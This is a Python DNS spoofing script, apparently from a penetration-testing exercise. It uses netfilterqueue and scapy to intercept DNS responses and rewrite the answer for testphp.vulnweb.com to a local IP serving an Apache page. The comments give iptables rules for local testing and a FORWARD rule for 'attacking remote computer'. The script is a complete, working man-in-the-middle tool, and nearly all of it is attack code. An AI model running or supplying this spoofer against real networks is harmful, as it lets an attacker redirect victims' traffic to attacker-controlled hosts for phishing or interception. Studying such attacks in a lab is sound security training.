#!/usr/bin/env python
#dns_spoof
#in this script we need to use the input and output for iptables
#request/response
#iptables -I OUTPUT -j NFQUEUE --queue-num 1001 && iptables -I INPUT -j NFQUEUE --queue-num 1001
#using this iptable config is for testing purposes on your own machine 
#iptables -I FORWARD -j NFQUEUE --queue-num 1001
#use this when attacking remote computer 
import netfilterqueue
import scapy.all as sc

def process_packet(pkt):
    #print(pkt.get_payload())
    sc_pkt = sc.IP(pkt.get_payload())
    
    target_domain_name = 'testphp.vulnweb.com'
    if sc_pkt.haslayer(sc.DNSRR): #dns repsonse, request would be RQ 
        print(sc_pkt.show())
        qname = sc_pkt[sc.DNSQR].qname 
        if target_domain_name in str(qname):
            print(qname)
            print(sc_pkt.show())
            print('[+] Target domain caught. Starting spoof for {}'.format(str(target_domain_name)))
            
            spoof_answer = sc.DNSRR(rrname=qname,rdata = '192.168.241.132') #stand up basic apache page --> #service apache2 start
            sc_pkt[sc.DNS].an = spoof_answer
            sc_pkt[sc.DNS].ancount = 1 #sends 1 answer corresponding to spoof answer sent 
            del sc_pkt[sc.IP].len    
            del sc_pkt[sc.IP].chksum
            del sc_pkt[sc.UDP].len
            del sc_pkt[sc.UDP].chksum
            pkt.set_payload(bytes(sc_pkt)) #code up to this point has not modified the original packet, it has created scapy packet and changed params for it, now we set the packet payload to scapy packet to use against target
        #print(sc_pkt.show()) #easy way to capture a dns request is by pinging a domain name, will return the public IP and script will capture the response+
    pkt.accept() #will forward pkt and victim gets correct function
    #pkt.drop() //drops pkt and victim gets not internet connection



queue = netfilterqueue.NetfilterQueue()
queue.bind(1001, process_packet)
queue.run()
